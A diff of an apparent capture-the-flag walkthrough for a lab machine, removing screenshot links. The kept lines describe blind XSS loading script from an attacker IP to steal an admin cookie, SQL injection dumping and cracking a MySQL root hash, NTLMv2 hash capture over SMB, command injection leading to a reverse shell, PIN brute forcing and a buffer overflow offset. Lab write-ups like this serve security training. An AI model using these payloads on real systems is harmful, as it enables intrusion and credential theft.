@@ -133,37 +133,29 @@ PORT     STATE SERVICE
 
  Inspecting the webpage we can see that we have the option to Register or Login. 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/eb44113b-c65c-4098-a620-15a5a3261738/image.png)
-
 If we try to register a new user, the website will allow us to do it: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/13daa422-a4f1-4127-b37d-74386696bd1a/image.png)
 
 We can see that after hitting the `Submit Query` the server changed the URL to reflect that user was created:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/27cea911-ed27-49bd-be06-b8578de5ccbe/image.png)
 
 Now, let’s try to authenticate with the credentials we just created. 
 
 After hitting login we will see that the server allowed us to log on:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/48ccfea0-1abc-4981-9188-7e7ff5f5f731/image.png)
 
 Now we have a new view which consists on few fields for transferring e-coins. 
 
 Let’s try to send a test transfer to see how the server responds:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/b353f208-a564-4b66-a5e9-e1fd6ae5011e/image.png)
 
 Immediately, after hitting Transfer E-COIN we can see popup message indicating that our transfer will be reviewed by an admin:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/b3656606-e29f-4849-b727-c7a05b2bc90a/image.png)
 
 Based on this response, we can infer that each request or transfer submitted has to be review by someone. This indicates a possibility to inject a malicious XSS code in order to steal the cookies from the admin. 
 
 Inspecting the request on BurpSuite we can see some additional information about how the cookies are handled: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/9ff085e3-6380-40af-9870-f2b459798f7f/image.png)
 
 The `id=3` indicates our current user id, which means that user 1 and user 2 already exists. 
 
@@ -177,13 +169,11 @@ XSS Blind:
 <script src="http://10.10.14.4/test.js"></script>
 ```
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/2e7ae141-ece8-41db-8a72-82f32ea4b568/image.png)
 
 After sending the request, we need to open a HTTP server on kali (could be using python module). 
 
 If the admin is actively checking the requests, then, we should receive a HTTP request in our server: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/9e488004-6c4a-4947-b920-a9161e3c420d/image.png)
 
 This indicates that server is vulnerable to XSS Blind. 
 
@@ -207,7 +197,6 @@ Then, let’s use again the `src`  request to specify the file we just created a
 
 After sending the request, we should receive 2 requests, one for the JS script we created, which contains at the same time other javascript code, and the second request showing the content of the cookie after executing that javascript code: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/fa901eb5-d601-4ce4-a306-781f8140c25a/image.png)
 
 From the output we can see the Cookie for the admin, which as seen previously, it’s enconded on Base64: 
 
@@ -225,13 +214,11 @@ password=Hopelessromantic
 
 Let’s login with the credentials:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/7e45d83d-25e2-4e5f-9aab-3dfdb7b863f4/image.png)
 
 After login, we can see more options in the control panel. 
 
 Checking the ID search box we can see that it is vulnerable to SQL Injection:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/ef2d1eb6-7f81-408f-8e79-a3f9f8ec6585/image.png)
 
 SQL Enumeration:
 
@@ -245,7 +232,6 @@ We can start with a high number like 10 columns to see if it returns errors:
 
 Result:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/713c8eb2-7e4d-455f-b17e-a07afad8c2f5/image.png)
 
 After testing with a lower number we will see that at the number 3 it stops giving errors:
 
@@ -260,7 +246,6 @@ After testing with a lower number we will see that at the number 3 it stops givi
 1' order by 3-- -
 ```
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/fdd1709a-c613-4f1f-888e-5afbcb2ba857/image.png)
 
 This means that the query we see in the browser is only capable to return 3 columns as results. We need to have this in mind for the subsequent queries as we can’t indicate less than 3 columns or more than 3 in our queries. 
 
@@ -272,7 +257,6 @@ Next, we need to determine the version of the DB:
 
 Result:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/72241084-b249-4799-8fca-6d3c68c40bc2/image.png)
 
 Noticed that we also specified the columns 2 and 3 in the query, this is because the query needs to return always at least 3 columns as we saw in the earlier testing.  We can use the ‘space’ of one of the 3 columns to inject our command, that said, it’s the same if we do:
 
@@ -290,7 +274,6 @@ https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sh
 
 For better visibility let’s capture the request in BurpSuite and sent it to repeater: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/35d33695-a5dd-4c4e-9856-066cff29f6d3/image.png)
 
 Let’s enumerate the databases:
 
@@ -300,7 +283,6 @@ Let’s enumerate the databases:
 
 Result:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/2938918a-a6c1-4f5c-bee4-f4712bc8937d/image.png)
 
 We can see the databases `bankrobber`, and `test` as the non-default ones, also the `mysql`
 
@@ -312,7 +294,6 @@ Let’s check what is the current DB in use:
 
 Result:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/d9f4bcc3-7f92-4fbe-8501-d550904078f9/image.png)
 
 We can see the current DB in use is `bankrobber`
 
@@ -324,7 +305,6 @@ Let’s enumerate the other DBs, for instance check the tables inside the `mysql
 
 Result:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/d2c522f2-ebd3-4439-a635-bb5da0a2c376/image.png)
 
 We can see the table `user`
 
@@ -336,7 +316,6 @@ Let’s enumerate the columns of that table:
 
 Result:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/e39c91ce-ad0a-48c8-929d-2da183d2b166/image.png)
 
 We can see the columns `User` and `Password` as the most interesting
 
@@ -348,7 +327,6 @@ Since we have the table name, and the columns, we can directly enumerate the tab
 
 Result:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/45249215-4a5f-4b43-811d-b5f38c0263b9/image.png)
 
 We can see password hash for root. 
 
@@ -360,7 +338,6 @@ root:F435725A173757E57BD36B09048B8B610FF4D0C4
 
 Cracking the credentials: Using https://crackstation.net/ we can try to crack the password:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/aad4f957-4bf1-4c7a-9f53-fe60790be8c5/image.png)
 
 Success! We have the password in clear text for the user root of the MySQL. 
 
@@ -372,13 +349,11 @@ root:Welkom1!
 
 However after testing the credentials against the server we can see that we couldn’t authenticate as our machine is not authorized. 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/be11855d-fea0-4215-a3c8-2564d86cb6b6/image.png)
 
 Let’s try again with a different approach using the SQL Injection again, this time we can take advantage of the function `load_file()` to generate a SMB request from the server to our kali machine, by doing this we can capture the hash NTLMv2 of the user.
 
 First start a SMB Server on Kali:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/2957d18a-29f0-4a59-b118-0118b000b44b/image.png)
 
 Execute the following command: 
 
@@ -390,7 +365,6 @@ Note: remember to scape the backslashes from the query.
 
 After executing the command we will the NTLMv2 hash from the user `Cortin`:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/b3203c46-995a-44d3-a49a-c47bae03b762/image.png)
 
 ```sql
 Cortin::BANKROBBER:aaaaaaaaaaaaaaaa:8aa2a43886451f6b180250b2ce8d9b31:0101000000000000800703b28f47db0143b691cc4d90b87000000000010010004a0078006a0048006100540076007100030010004a0078006a00480061005400760071000200100054007100420073005a0076007a0046000400100054007100420073005a0076007a00460007000800800703b28f47db01060004000200000008003000300000000000000000000000002000005b27698cd82c018b972cf7396f2f743d3c73dbeea5bb418e7be489fad01c192b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003500000000000000000000000000
@@ -405,21 +379,17 @@ sudo john hash-cortin.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/roc
 
 However it looks like hash is not crackeable.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/76cdabd1-f379-484e-bff9-97d4a9602dd4/image.png)
 
 Moving on, we will on the website another function called `Backdoorchecker`that apparently allow us to execute the dir command: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/3a9ce2c4-6ffe-46f6-8b71-81bdac0e5df9/image.png)
 
 However, if we try to execute the `dir` command it give us a warning that such command is only authorized to be executed if the request comes from the same server. 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/c47e705b-78c8-4a3f-9d82-f95780cecd4c/image.png)
 
 Based on this information, we could potentially abuse the XSS to convert it into a XSRF attack. 
 
 First, let’s take a look at the request sent using BurpSuite: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/ecd07793-eaa9-4568-a909-4b7568f6726f/image.png)
 
 We can see the request includes a parameter called `cmd=` followed by the command to be excuted which is `dir`. However, remember that we can only execute the command `dir`, but can also inject other commands by using the pipe `|`  
 
@@ -447,15 +417,12 @@ Finally, prepare the XSS command injection that will request our malicious JS:
 
 Let’s switch to a normal user in the website (no admin) and proceed to send a new request using the transfer function: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/1750494a-7a4b-457d-ae43-2674bdf2d680/image.png)
 
 After some minutes we will see the first request to our malicious JS Script: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/41c3451c-c3d7-4ffb-a3fd-4b24819d22a8/image.png)
 
 Immediately, we will receive the reverse shell that we defined in the JS Script: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/9b12beeb-c541-4e1c-b80d-46857270666c/image.png)
 
 Note: if after few minutes there is nothing received from the server, proceed to log off and log in again, send the request. Repeat this step until you receive the connection. 
 
@@ -465,35 +432,28 @@ Note: if after few minutes there is nothing received from the server, proceed to
 
 Checking the ports currently opened on the machine we will see one port that was not included in the initial scans, this port is `910`
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/d94e8565-aea1-4003-89e9-a80b6e4b1a8b/image.png)
 
 We can see the PID associated with the port as `1648`
 
 Checking the current list of processes running on Windows, we will that it belongs to a program identified as `bankv2.exe`
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/ccc002b0-2c37-4a69-a98a-bf69bc9a2c93/image.png)
 
 This process seems to be the file we can find in the C:\ path 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/a6110ed9-4d5a-4c76-9ec2-ff8f57a8769c/image.png)
 
 If we try to open the binary, it gives the following response: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/1bd88c41-a2e9-4c7d-9d92-06efaccc7250/image.png)
 
 Which according to Google Translate, it’s `Access Denied`
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/4f6a3a41-ca54-40f4-93e0-8fd7d44de046/image.png)
 
 Now, since the program is running under port 910, we can use nc.exe to connect internally to if we get another type of response: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/c3f0ea57-99f7-4bc4-b9ca-8a1f5ff1e408/image.png)
 
 After trying to connect to the port 910, we can see another response, this time is asking us for 4-digit PIN. 
 
 If try to provide a random PIN it gives Access Denied and get’s disconnected. 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/53a8e6a1-72bc-4a00-b4cc-e94136965ca3/image.png)
 
 However, since a 4-digit PIN is quite easy to brute force, we can try to create a portforwarding for the port 910 to our kali machine and after that, create a script that performs the brute force against the server. 
 
@@ -580,19 +540,16 @@ python3 brute-force.py 127.0.0.1 910 PIN.txt
 
 After few seconds we will the correct PIN: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/049866cb-4b9b-4432-89d6-b26c5457ac60/image.png)
 
 We can see the PIN as `0021`
 
 Checking with the tool:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/3abc3da4-06ce-4760-910e-831d4e10dce2/image.png)
 
 After entering the PIN we can see `Access granted` and now is asking to enter an amount of e-coins. 
 
 Testing a with a random number: 
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/70fa8d8f-249e-4b18-9c3f-60d5f46445bd/image.png)
 
 The program replied with the following line which is interesting: 
 
@@ -602,7 +559,6 @@ $] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe
 
 If we enter another value but this time with more values:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/14a53fb1-b9f6-49f0-9b10-e914524af998/image.png)
 
 We will see that the line `Executing e-coin transfer tool` with some of the numbers we provided, meaning that program seems to be vulnerable to some kind of overflow. 
 
@@ -616,7 +572,6 @@ Based on this information we can use `pattern_create.rb`  to measure the offset 
 
 Testing the payload:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/e56c1b17-55f5-43e1-b52d-c7b3728ce595/image.png)
 
 Let’s grab the first 4 digits of the payload execution which are: 
 
@@ -632,6 +587,5 @@ Using the `pattern_offset` we can determine the offset:
 
 Result:
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/40c13e3e-3687-497d-93cf-a757dc0b2373/c664366c-2555-493f-ab90-c423d6bb1478/image.png)
 
 This indicates that the offset is 32:
